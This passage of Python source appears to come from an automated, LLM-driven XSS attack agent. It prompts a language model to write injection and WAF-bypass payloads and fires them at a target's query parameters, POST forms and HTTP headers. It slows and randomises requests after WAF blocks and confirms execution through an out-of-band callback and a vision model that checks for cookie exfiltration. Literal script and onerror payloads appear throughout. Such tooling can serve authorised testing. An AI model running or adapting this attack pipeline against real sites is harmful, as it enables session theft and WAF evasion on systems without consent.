        impact_match = re.search(r'<impact>(.*?)</impact>', block, re.DOTALL)
        confidence_match = re.search(r'<confidence>(.*?)</confidence>', block, re.DOTALL)

        return {
            "payload": code,
            "reasoning": reasoning_match.group(1).strip() if reasoning_match else "",
            "impact": impact_match.group(1).strip() if impact_match else "execution",
            "confidence": float(confidence_match.group(1).strip()) if confidence_match else 0.7
        }

    def _replace_callback_urls(self, code: str, interactsh_url: str) -> str:
        """Replace callback URL placeholders with actual interactsh URL."""
        import re
        if "{{interactsh_url}}" in code:
            return code.replace("{{interactsh_url}}", interactsh_url)
        elif "CALLBACK_URL" in code or "callback_url" in code.lower():
            return re.sub(r'(?i)callback_url', interactsh_url, code)
        return code

    def _extract_payloads_by_patterns(self, response: str) -> List[Dict]:
        """Extract payloads using regex patterns for common XSS indicators."""
        import re
        payloads = []
        code_patterns = [
            r'`([^`]+(?:alert|fetch|document\.|onerror|onload)[^`]+)`',
            r'Payload[:\s]+([^\n]+)',
        ]

        for pattern in code_patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            for m in matches[:3]:  # Limit to 3
                cleaned = self._clean_payload(m.strip(), "")
                if len(cleaned) > 5 and any(x in cleaned.lower() for x in ['<', 'alert', 'fetch', 'document']):
                    payloads.append({
                        "payload": cleaned,
                        "reasoning": "Extracted from LLM response",
                        "impact": "execution",
                        "confidence": 0.5
                    })

        return payloads

    async def _llm_analyze(self, html: str, param: str, interactsh_url: str, context_data: Dict = None) -> Optional[Dict]:
        """Ask LLM to analyze HTML and generate payload."""
        import json
        context_str = json.dumps(context_data or {}, indent=2)
        
        master_prompt = """You are an elite XSS (Cross-Site Scripting) expert.
Analyze the provided HTML and the reflection context metadata.
Your goal is to generate a payload that will execute JavaScript.
The payload MUST include this callback URL for validation: {interactsh_url}

REFLECTION CONTEXT METADATA:
{context_data}

Rules:
1. If reflection is in 'html_text', use tags like <svg/onload=...> or <img src=x onerror=...>.
2. If reflection is in 'attribute_value', try to break out using "> or '>.
3. If reflection is in 'script' context, try to break out using '; or "; or use template literals.
4. ONLY generate a payload if the 'surviving_chars' allow for the necessary breakout.
5. If major characters like < or > are missing, try event handlers or javascript: pseudo-protocol if applicable.

Response Format (XML-Like):
<thought>Analysis of the context and why the chosen payload will work</thought>
<payload>The payload string</payload>
<validation_method>interactsh OR vision OR cdp</validation_method>
<context>Description of target context (e.g., inside href, between tags)</context>
<confidence>0.0 to 1.0</confidence>
"""

        if self.system_prompt:
             parts = self.system_prompt.split("# XSS Bypass Prompt")
             master_prompt = parts[0].replace("# Master XSS Analysis Prompt", "").strip()
             master_prompt += f"\n\nREFLECTION CONTEXT METADATA:\n{context_str}"

        # Safer generic replacement
        system_prompt = master_prompt.replace("{interactsh_url}", interactsh_url) \
                                     .replace("{probe}", self.PROBE_STRING) \
                                     .replace("{PROBE}", self.PROBE_STRING) \
                                     .replace("{context_data}", context_str)
        
        user_prompt = f"""Target URL: {self.url}
Parameter: {param}
Probe: {self.PROBE_STRING}
Interactsh: {interactsh_url}

HTML Reflection Source (truncated):
```html
{html[:12000]}
```

Generate the OPTIMAL XSS payload based on the metadata and HTML.
"""
        
        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="XSS_AGENT",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=8000 # Increased for reasoning models
            )
            
            # DEBUG: Log raw response to see what LLM is actually generating
            logger.info(f"LLM Raw Response ({len(response)} chars)")
            
            # Robust XML Parsing
            from bugtrace.utils.parsers import XmlParser
            tags = ["payload", "validation_method", "context", "confidence"]
            data = XmlParser.extract_tags(response, tags)
            
            if data.get("payload"):
                cleaned_payload = self._clean_payload(data["payload"], param)
                return {
                    "vulnerable": True,
                    "payload": cleaned_payload,
                    "validation_method": data.get("validation_method", "interactsh"),
                    "context": data.get("context", "LLM Generated"),
                    "confidence": float(data.get("confidence", 0.9))
                }
            
            # Fallback for non-XML compliant models (Regex-based search for common patterns)
            if "alert(" in response or "fetch(" in response:
                logger.warning(f"[{self.name}] LLM failed XML tags but returned code. Attempting to extract payload manually.")
                # Look for the last line that looks like a payload
                lines = [l.strip() for l in response.strip().split("\n") if l.strip()]
                for line in reversed(lines):
                    if "alert(" in line or "fetch(" in line:
                        cleaned = self._clean_payload(line, param)
                        return {
                            "vulnerable": True,
                            "payload": cleaned,
                            "validation_method": "interactsh",
                            "context": "Heuristic Extraction",
                            "confidence": 0.5
                        }
            return None
            
        except Exception as e:
            logger.error(f"LLM analysis failed: {e}", exc_info=True)
            return None
    
    async def _llm_generate_bypass(self, previous_payload: str, response_snippet: str, interactsh_url: str) -> Optional[Dict]:
        """Ask LLM to generate bypass payload."""
        bypass_prompt_template = """The previous payload did not trigger a callback.
Previous payload: {previous_payload}
HTTP Response: {response_snippet}
Analyze why it failed and generate a BYPASS payload with {interactsh_url}.

Response Format (XML-Like):
<thought>Analysis of failure</thought>
<bypass_payload>New payload to try</bypass_payload>
<confidence>0.1 to 1.0</confidence>
"""

        if self.system_prompt and "# XSS Bypass Prompt" in self.system_prompt:
             bypass_prompt_template = self.system_prompt.split("# XSS Bypass Prompt")[1].strip()

        prompt = bypass_prompt_template.replace("{previous_payload}", previous_payload) \
                                       .replace("{response_snippet}", response_snippet[:3000]) \
                                       .replace("{interactsh_url}", interactsh_url)
        
        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS_AGENT_BYPASS",
                system_prompt="You are a WAF bypass expert. Respond ONLY in XML tags: <bypass_payload>, <confidence>.",
                model_override=settings.MUTATION_MODEL,
            )
            
            from bugtrace.utils.parsers import XmlParser
            tags = ["bypass_payload", "confidence"]
            data = XmlParser.extract_tags(response, tags)
            
            if data.get("bypass_payload"):
                data["bypass_payload"] = self._clean_payload(data["bypass_payload"], "fake") # we clean but without specific param if unknown
                return data
            return None
            
        except Exception as e:
            logger.error(f"LLM bypass generation failed: {e}", exc_info=True)
            return None
    
    async def _send_payload(self, param: str, payload: str) -> str:
        """Send XSS payload to target with WAF awareness."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import aiohttp
        
        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = payload
        
        attack_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(attack_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    # Reset block counter on success (if not a 403)
                    if resp.status == 200:
                        if self.consecutive_blocks > 0:
                            logger.info(f"[{self.name}] Target responded 200. Recovering...")
                        self.consecutive_blocks = 0
                    elif resp.status in [403, 406, 501]:
                        self.consecutive_blocks += 1
                        logger.warning(f"[{self.name}] Potential WAF Block ({resp.status}). Counter: {self.consecutive_blocks}")
                    
                    return await resp.text()
        except Exception as e:
            self.consecutive_blocks += 1
            logger.warning(f"[{self.name}] Network Failure / WAF TCP Reset. Counter: {self.consecutive_blocks}")
            
            # TRIGGER STEALTH MODE
            if self.consecutive_blocks >= 3 and not self.stealth_mode:
                self.stealth_mode = True
                dashboard.log(f"[{self.name}] 🛡️ WAF DETECTED! Entering Stealth Mode (Slown-down & Random Delay)", "WARN")
                logger.warning(f"[{self.name}] WAF confirmed via network resets. Enabling Stealth Mode.")
                
            return ""

    async def _fast_reflection_check(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
        """
        Use Go fuzzer if available, otherwise fall back to Python.
        Returns list of reflection objects: [{"payload": "...", "encoded": False, "context": "..."}]
        """
        # Try Go fuzzer first
        go_result = await external_tools.run_go_xss_fuzzer(url, param, payloads)
        
        if go_result and go_result.get("reflections"):
            duration = go_result.get("metadata", {}).get("duration_ms", 0)
            logger.info(f"[{self.name}] Go fuzzer found {len(go_result['reflections'])} reflections in {duration}ms")
            return go_result["reflections"]
        
        # Fallback to Python (simulating reflection objects)
        reflected_payloads = await self._python_reflection_check(url, param, payloads)
        return [{"payload": p, "encoded": False, "context": "unknown"} for p in reflected_payloads]

    async def _python_reflection_check(self, url: str, param: str, payloads: List[str]) -> List[str]:
        """
        Fallback reflection check using Python aiohttp.
        """
        reflected = []
        for p in payloads:
            html = await self._send_payload(param, p)
            if p in html:
                reflected.append(p)
        return reflected
    
    async def _validate(
        self,
        param: str,
        payload: str,
        response_html: str,
        method: str,
        screenshots_dir: Path
    ) -> tuple:
        """
        Hunter Validation: Optimized for speed and safety.
        
        1. Interactsh (OOB) - CONFIRMED (Fastest)
        2. Playwright (Browser) - CONFIRMED (Safe Concurrency)
        3. Reflection Check - PENDING_CDP_VALIDATION for Manager (Exclusive CDP)
        """
        evidence = {"payload": payload}

        # 1. Interactsh (Definitive OOB) - No browser needed
        if self.interactsh:
            await asyncio.sleep(1) 
            label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
            hit_data = await self.interactsh.check_hit(label)
            if hit_data:
                evidence["interactsh_hit"] = True
                evidence["interactions"] = [hit_data]
                dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED!", "CRITICAL")
                return True, evidence

        # 2. Playwright Validation (Multi-threaded Safe)
        # We skip CDP entirely here (prefer_cdp=False in constructor)
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = payload
        attack_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))

        dashboard.log(f"[{self.name}] 🌐 Browser Validation (Playwright)...", "INFO")
        result = await self.verifier.verify_xss(
            url=attack_url,
            screenshot_dir=str(screenshots_dir),
            timeout=8.0 
        )
        
        if result.success:
            evidence.update(result.details)
            evidence["playwright_confirmed"] = True
            evidence["screenshot_path"] = result.screenshot_path
            evidence["method"] = result.method
            
            # ✅ NEW: Call Vision AI if we have screenshot
            if result.screenshot_path:
                dashboard.log(f"[{self.name}] 📸 Calling Vision AI for impact validation...", "INFO")
                
                try:
                    # Import Vision client
                    from bugtrace.core.llm_client import get_vision_model
                    vision_client = get_vision_model()
                    
                    # Prepare prompt with IMPACT FOCUS
                    vision_prompt = f"""Analyze this screenshot for XSS execution WITH REAL IMPACT.

URL: {attack_url}
Payload: {payload}

CRITICAL: Do NOT confirm low-impact XSS like alert(1) which can be sandboxed.

Look for HIGH-IMPACT evidence:
1. **Tier 1 (CRITICAL - Auto-confirm)**:
   - Cookie/token exfiltration (document.cookie, fetch to external server)
   - Session hijacking demonstration
   - Account takeover POC

2. **Tier 2 (HIGH - Confirm if clear)**:
   - document.domain access (proves main context execution)
   - localStorage/sessionStorage access
   - DOM manipulation affecting user actions (form hijacking, etc.)

3. **Tier 3 (MEDIUM - REJECT)**:
   - Simple alert(1) - likely sandboxed, NO IMPACT
   - console.log() - NO IMPACT
   - Reflection in isolated context (iframe sandbox) - NO IMPACT

Look for visual evidence:
- Alert/dialog showing sensitive data (cookies, domain, storage)
- Network tab showing outbound requests to attacker server
- Console logs revealing document.cookie or document.domain
- DOM changes that affect functionality (not just cosmetic)

Return JSON:
{{
    "success": true/false,
    "impact_tier": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
    "confidence": 0.0-1.0,
    "evidence": "what you see that proves impact",
    "impact_type": "cookie_exfiltration" | "domain_access" | "storage_access" | "alert_only" | "no_execution",
    "reason": "why it is/isn't a real XSS with impact",
    "sandbox_detected": true/false
}}
"""
                    
                    # TASK-53: Retry logic with exponential backoff
                    vision_result = None
                    max_retries = 3
                    for attempt in range(max_retries):
                        try:
                            vision_result = await vision_client.analyze_image(
                                image_path=result.screenshot_path,
                                prompt=vision_prompt
                            )
                            break  # Success, exit retry loop
                        except Exception as retry_error:
                            if attempt == max_retries - 1:
                                raise  # Re-raise on final attempt
                            logger.warning(f"Vision validation attempt {attempt + 1}/{max_retries} failed: {retry_error}")
                            await asyncio.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s

                    if vision_result is None:
                        raise Exception("Vision validation failed after all retries")
                    
                    # Parse response
                    impact_tier = vision_result.get("impact_tier", "LOW")
                    confidence = vision_result.get("confidence", 0)
                    sandbox_detected = vision_result.get("sandbox_detected", False)
                    
                    # Only confirm Tier 1 (CRITICAL) and Tier 2 (HIGH) with high confidence
                    if (impact_tier in ["CRITICAL", "HIGH"] and 
                        confidence > 0.7 and 
                        not sandbox_detected):
                        
                        # ✅ Vision confirmed HIGH IMPACT → VALIDATED_CONFIRMED
                        evidence["vision_confirmed"] = True
                        evidence["vision_confidence"] = confidence
                        evidence["vision_evidence"] = vision_result.get("evidence")
                        evidence["impact_tier"] = impact_tier
                        evidence["impact_type"] = vision_result.get("impact_type")
                        
                        dashboard.log(
                            f"[{self.name}] ✅ VALIDATED via Vision AI "
                            f"({impact_tier} impact, conf={confidence:.2f})", 
                            "SUCCESS"
                        )
                        return True, evidence
                        
                    elif impact_tier == "MEDIUM":
                        # ⚠️ Likely sandboxed alert(1) - REJECT
                        evidence["vision_confirmed"] = False
                        evidence["vision_reason"] = "Low impact (likely sandboxed alert)"
                        evidence["impact_tier"] = "MEDIUM"
                        evidence["rejected_reason"] = "No demonstrable impact (alert without data access)"
                        
                        dashboard.log(
                            f"[{self.name}] ❌ REJECTED: Low impact XSS (alert only, no data exfiltration)", 
                            "WARNING"
                        )
                        
                        # DO NOT send to AgenticValidator - just reject
                        return False, evidence
                        
                    else:
                        # ❌ Vision inconclusive or LOW tier → send to AgenticValidator for review
                        evidence["vision_confirmed"] = False
                        evidence["vision_reason"] = vision_result.get("reason", "Low confidence or tier")
                        evidence["impact_tier"] = impact_tier
                        
                        dashboard.log(
                            f"[{self.name}] ⚠️ Vision inconclusive ({impact_tier}), flagging for AgenticValidator", 
                            "WARNING"
                        )
                except Exception as e:
                    logger.error(f"[{self.name}] Vision AI validation failed: {e}", exc_info=True)
                    evidence["vision_error"] = str(e)
            
            dashboard.log(f"[{self.name}] 👁️ Confirmed via Playwright", "SUCCESS")
            return True, evidence

        # 3. Smart Reflection Check (Queuing for Manager Audit)
        # We check for the payload literal, but also its decoded variants
        # (Handling Double Encoding and server-side normalization)
        import urllib.parse
        import html
        
        # Test multiple decoding levels
        p_decoded = urllib.parse.unquote(payload)
        p_double_decoded = urllib.parse.unquote(p_decoded)
        p_html_decoded = html.unescape(p_decoded)
        
        reflections = [payload, p_decoded, p_double_decoded, p_html_decoded]
        
        # Identify if any 'dangerous' part of the payload survived in decoded form
        # especially if we sent it encoded.
        survived = False
        for ref in set(reflections):
            if ref and ref in response_html:
                # Basic proof of reflection
                survived = True
                break
        
        if survived:
             evidence["reflected"] = True
             evidence["status"] = "PENDING_CDP_VALIDATION"
             dashboard.log(f"[{self.name}] 🔍 Reflection detected (possibly decoded). Delegating to Auditor CDP Audit.", "INFO")
             return True, evidence

        return False, evidence
    
    async def _test_fragment_xss(
        self,
        param: str,
        interactsh_url: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Test Fragment-based XSS (DOM XSS via location.hash).
        This bypasses WAFs because fragments (#payload) don't reach the server.
        Level 7+ targets often use location.hash in innerHTML/eval, creating DOM XSS.
        """
        dashboard.log(f"[{self.name}] 🔗 Testing FRAGMENT XSS (bypassing WAF via location.hash)...", "INFO")
        
        for fragment_template in self.FRAGMENT_PAYLOADS:
            payload = fragment_template.replace("{{interactsh_url}}", interactsh_url)
            
            # Build fragment URL - CRITICAL: Remove query params, payload goes in fragment ONLY
            # Level 7's JS: if (location.hash) { innerHTML = decodeURIComponent(loc hash.substring(1)) }
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(self.url)
            
            # Construct clean URL: path only (no query), payload in fragment
            fragment_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
            
            dashboard.set_current_payload(payload[:60], "Fragment XSS", "Testing")
            logger.info(f"[{self.name}] Testing Fragment: {fragment_url}")
            
            # Validate in browser (Fragment XSS requires browser execution)
            try:
                # Use updated verify_xss method
                result = await self.verifier.verify_xss(
                    url=fragment_url,
                    screenshot_dir=str(screenshots_dir),
                    timeout=10.0
                )
                
                if result.success:
                    dashboard.log(f"[{self.name}] 🎯 FRAGMENT XSS SUCCESS! ({result.method})", "SUCCESS")
                    
                    evidence = result.details or {}
                    evidence["method"] = result.method
                    evidence["screenshot_path"] = result.screenshot_path
                    if result.console_logs:
                        evidence["console_logs"] = result.console_logs

                    return XSSFinding(
                        url=self.url,
                        parameter=f"#fragment (bypassed {param})",
                        payload=payload,
                        context="dom_xss_fragment",
                        validation_method=f"vision+{result.method}",
                        evidence=evidence,
                        confidence=1.0,
                        status="VALIDATED_CONFIRMED",  # CDP browser already confirmed execution
                        validated=True,
                        screenshot_path=result.screenshot_path,
                        reflection_context="location.hash → innerHTML",
                        surviving_chars="N/A (client-side)"
                    )
            except Exception as e:
                logger.debug(f"Fragment test failed for {payload[:30]}: {e}")
                continue
        
        logger.info(f"[{self.name}] No Fragment XSS found after testing {len(self.FRAGMENT_PAYLOADS)} payloads")
        return None
    
    async def _discover_params(self) -> List[str]:
        """Discover injectable parameters from the page."""
        from bs4 import BeautifulSoup
        from urllib.parse import urlparse, parse_qs

        discovered = []

        # 1. Extract from URL
        parsed = urlparse(self.url)
        for param in parse_qs(parsed.query).keys():
            discovered.append(param)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        # 2. Extract from HTML forms
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    html = await resp.text()

            soup = BeautifulSoup(html, 'html.parser')

            for inp in soup.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name and name not in discovered:
                    discovered.append(name)

        except Exception as e:
            logger.warning(f"Param discovery error: {e}")

        # PRIORITIZE parameters (high-value first)
        return self._prioritize_params(discovered)

    # =========================================================================
    # PARAMETER PRIORITIZATION: Test high-value params first
    # =========================================================================

    # Parameters historically more prone to XSS (ordered by likelihood)
    HIGH_PRIORITY_PARAMS = [
        # Search/Query - Most common XSS vectors
        "q", "query", "search", "s", "keyword", "keywords", "term", "terms",
        # Redirect/URL - Often unvalidated
        "url", "redirect", "redirect_url", "return", "return_url", "returnUrl",
        "next", "goto", "destination", "dest", "target", "redir", "redirect_to",
        "continue", "forward", "ref", "referrer",
        # Callback/JSONP - JavaScript context
        "callback", "cb", "jsonp", "jsonpcallback", "call",
        # Input/Display - User-facing content
        "input", "text", "value", "data", "content", "body", "message", "msg",
        "name", "username", "user", "email", "title", "subject", "comment",
        # File/Path - Sometimes reflected
        "file", "filename", "path", "page", "view", "template",
        # Error/Debug - Often reflected in error messages
        "error", "err", "debug", "msg", "message", "alert",
        # ID/Reference - Sometimes used in display
        "id", "item", "product", "article", "post",
    ]

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """
        Prioritize parameters for testing.
        High-priority params (search, callback, redirect) are tested first.
        """
        high_priority = []
        medium_priority = []
        low_priority = []

        for param in params:
            param_lower = param.lower()

            # Check if it's a high-priority param
            is_high = False
            for hp in self.HIGH_PRIORITY_PARAMS:
                if hp in param_lower or param_lower in hp:
                    is_high = True
                    break

            if is_high:
                high_priority.append(param)
            elif any(x in param_lower for x in ["id", "num", "count", "page", "size", "limit", "offset"]):
                # Numeric params are usually less vulnerable
                low_priority.append(param)
            else:
                medium_priority.append(param)

        # Return prioritized list
        prioritized = high_priority + medium_priority + low_priority

        if high_priority:
            logger.info(f"[{self.name}] 🎯 High-priority params detected: {high_priority}")
            dashboard.log(f"[{self.name}] 🎯 Testing high-priority params first: {', '.join(high_priority[:5])}", "INFO")

        return prioritized

    # =========================================================================
    # ADDITIONAL ATTACK VECTORS: POST, Headers, Cookies
    # =========================================================================

    # Headers commonly vulnerable to XSS reflection
    INJECTABLE_HEADERS = [
        "Referer",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "User-Agent",
        "X-Requested-With",
        "Accept-Language",
    ]

    async def _test_post_params(
        self,
        form_action: str,
        post_params: Dict[str, str],
        interactsh_url: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """Test POST parameters for XSS."""
        dashboard.log(f"[{self.name}] 📝 Testing POST form: {form_action}", "INFO")

        for param, original_value in post_params.items():
            if self._max_impact_achieved:
                break

            # Test with a simple payload first
            for payload_template in self.GOLDEN_PAYLOADS[:10]:  # Top 10 payloads
                payload = payload_template.replace("{{interactsh_url}}", interactsh_url)
                test_data = post_params.copy()
                test_data[param] = payload

                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            form_action,
                            data=test_data,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                            allow_redirects=True
                        ) as resp:
                            response_html = await resp.text()

                    # Check reflection
                    if payload in response_html or payload[:30] in response_html:
                        dashboard.log(f"[{self.name}] 🎯 POST param '{param}' reflects payload!", "SUCCESS")

                        # Validate with browser
                        validated, evidence = await self._validate(
                            param, payload, response_html, "interactsh", screenshots_dir
                        )

                        if validated:
                            evidence["vector"] = "POST"
                            evidence["form_action"] = form_action

                            should_stop, stop_reason = self._should_stop_testing(payload, evidence, 1)

                            return XSSFinding(
                                url=form_action,
                                parameter=f"POST:{param}",
                                payload=payload,
                                context="POST form submission",
                                validation_method="post_injection",
                                evidence=evidence,
                                confidence=0.9,
                                status="VALIDATED_CONFIRMED",
                                validated=True,
                                screenshot_path=evidence.get("screenshot_path"),
                                reflection_context="post_body"
                            )

                except Exception as e:
                    logger.debug(f"POST test failed for {param}: {e}")
                    continue

        return None

    async def _test_header_injection(
        self,
        interactsh_url: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """Test HTTP headers for XSS reflection."""
        dashboard.log(f"[{self.name}] 🔧 Testing header injection vectors...", "INFO")

        # Simple payload for header injection
        test_payloads = [
            f"<script>fetch('{interactsh_url}')</script>",
            "<img src=x onerror=alert(document.domain)>",
            "javascript:alert(document.cookie)",
        ]

        for header_name in self.INJECTABLE_HEADERS:
            if self._max_impact_achieved:
                break

            for payload in test_payloads:
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        header_name: payload
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            self.url,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            response_html = await resp.text()

                    # Check if header value is reflected
                    if payload in response_html or payload[:20] in response_html:
                        dashboard.log(f"[{self.name}] 🎯 Header '{header_name}' reflects payload!", "SUCCESS")

                        # This is a significant finding - header injection
                        evidence = {
                            "vector": "header",
                            "header_name": header_name,
                            "payload": payload,
                            "reflected": True
                        }

                        # Check for OOB callback
                        if self.interactsh:
                            await asyncio.sleep(1)
                            hit = await self.interactsh.check_hit("header_xss")
                            if hit:
                                evidence["interactsh_hit"] = True

                                return XSSFinding(
                                    url=self.url,
                                    parameter=f"HEADER:{header_name}",
                                    payload=payload,
                                    context=f"Header injection via {header_name}",
                                    validation_method="header_injection",
                                    evidence=evidence,
                                    confidence=0.95,
                                    status="VALIDATED_CONFIRMED",
                                    validated=True,
                                    reflection_context="http_header"
                                )

                except Exception as e:
                    logger.debug(f"Header test failed for {header_name}: {e}")
                    continue

        return None

    async def _discover_and_test_post_forms(
        self,
        interactsh_url: str,
        screenshots_dir: Path
    ) -> List[XSSFinding]:
        """Discover POST forms and test them for XSS."""
        from bs4 import BeautifulSoup
        from urllib.parse import urljoin

        findings = []

        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    html = await resp.text()

            soup = BeautifulSoup(html, 'html.parser')

            # Find all forms
            for form in soup.find_all('form'):
                method = (form.get('method') or 'get').lower()
                if method != 'post':
                    continue

                action = form.get('action', '')
                form_action = urljoin(self.url, action) if action else self.url

                # Extract form inputs
                post_params = {}
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        value = inp.get('value', '')
                        post_params[name] = value

                if post_params:
                    finding = await self._test_post_params(
                        form_action, post_params, interactsh_url, screenshots_dir
                    )
                    if finding:
                        findings.append(finding)
                        if self._max_impact_achieved:
                            break

        except Exception as e:
            logger.warning(f"POST form discovery failed: {e}")

        return findings
    
    async def handle_validation_feedback(
        self,
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante adaptada.

        Este método se llama cuando el validador no pudo ejecutar un payload
        y necesita una variante basada en el contexto observado.

        Args:
            feedback: Información detallada sobre por qué falló el payload

        Returns:
            Diccionario con el nuevo payload y metadata, o None si no hay variante
        """
        logger.info(
            f"[XSSAgent] Received validation feedback for {feedback.parameter}: "
            f"reason={feedback.failure_reason.value}"
        )

        original = feedback.original_payload

        # Try specific strategy for failure reason
        variant, method = await self._generate_variant_for_reason(feedback, original)

        # Fallback to LLM if no variant generated
        if not variant or variant == original:
            variant, method = await self._generate_llm_fallback_variant(feedback, original)

        # Guard: variant must be unique and different from original
        if not variant:
            logger.warning("[XSSAgent] Could not generate unique variant")
            return None

        if variant == original:
            logger.warning("[XSSAgent] Generated variant same as original")
            return None

        if feedback.was_variant_tried(variant):
            logger.warning("[XSSAgent] Generated variant already tried")
            return None

        logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
        return {
            "payload": variant,
            "method": method,
            "parent_payload": original,
            "adaptation_reason": feedback.failure_reason.value
        }

    async def _generate_variant_for_reason(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Generate variant based on specific failure reason."""
        reason = feedback.failure_reason

        # Guard: WAF blocked
        if reason == FailureReason.WAF_BLOCKED:
            return await self._handle_waf_blocked(original)

        # Guard: Context mismatch
        if reason == FailureReason.CONTEXT_MISMATCH:
            return self._handle_context_mismatch(feedback, original)

        # Guard: Encoding stripped
        if reason == FailureReason.ENCODING_STRIPPED:
            return self._handle_encoding_stripped(feedback, original)

        # Guard: Partial reflection
        if reason == FailureReason.PARTIAL_REFLECTION:
            return self._handle_partial_reflection()

        # Guard: CSP blocked
        if reason == FailureReason.CSP_BLOCKED:
            return self._handle_csp_blocked()

        # Guard: Timing issues
        if reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
            return self._handle_timing_issue(original)

        # Guard: No execution
        if reason == FailureReason.NO_EXECUTION:
            return await self._handle_no_execution(feedback, original)

        return None, "unknown"

    async def _handle_waf_blocked(self, original: str) -> Tuple[Optional[str], str]:
        """Handle WAF blocked scenario."""
        logger.info("[XSSAgent] WAF detected, trying encoded variants")
        encoded_variants = await self._get_waf_optimized_payloads([original], max_variants=1)
        if encoded_variants and encoded_variants[0] != original:
            return encoded_variants[0], "waf_bypass"
        return None, "waf_bypass"

    def _handle_context_mismatch(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle context mismatch scenario."""
        logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
        variant = self._adapt_to_context(original, feedback.detected_context)
        return variant, "context_adaptation"

    def _handle_encoding_stripped(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle encoding stripped scenario."""
        logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
        variant = self._encode_stripped_chars(original, feedback.stripped_chars)
        return variant, "char_encoding"

    def _handle_partial_reflection(self) -> Tuple[str, str]:
        """Handle partial reflection scenario."""
        logger.info("[XSSAgent] Partial reflection, trying simpler payload")
        return "<img src=x onerror=alert(1)>", "simplification"

    def _handle_csp_blocked(self) -> Tuple[Optional[str], str]:
        """Handle CSP blocked scenario."""
        logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
        variant = self._generate_csp_bypass_payload()
        return variant, "csp_bypass"

    def _handle_timing_issue(self, original: str) -> Tuple[str, str]:
        """Handle timing issue scenario."""
        logger.info("[XSSAgent] Timing issue, adding load event")
        variant = f"<body onload=\"{original.replace('<script>', '').replace('</script>', '')}\">"
        return variant, "timing_fix"

    async def _handle_no_execution(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Handle no execution scenario."""
        logger.info("[XSSAgent] No execution, trying different technique")
        llm_result = await self._llm_generate_bypass(
            original,
            feedback.reflected_portion or "",
            self.interactsh.get_url("xss_agent_bypass") if self.interactsh else ""
        )
        if llm_result:
            return llm_result.get('payload'), "llm_alternative"
        return None, "llm_alternative"

    async def _generate_llm_fallback_variant(
        self,
        feedback: ValidationFeedback,
        original: str
    ) -> Tuple[Optional[str], str]:
        """Generate variant using LLM fallback."""
        logger.info("[XSSAgent] Falling back to LLM generation")
        llm_result = await self._llm_generate_bypass(
            original,
            feedback.reflected_portion or "",
            self.interactsh.get_url("xss_agent_fallback") if self.interactsh else ""
        )
        if llm_result:
            return llm_result.get('payload'), "llm_fallback"
        return None, "llm_fallback"

    def _extract_js_code(self, payload: str) -> str:
        """Extract JavaScript execution code from payload."""
        js_code = payload
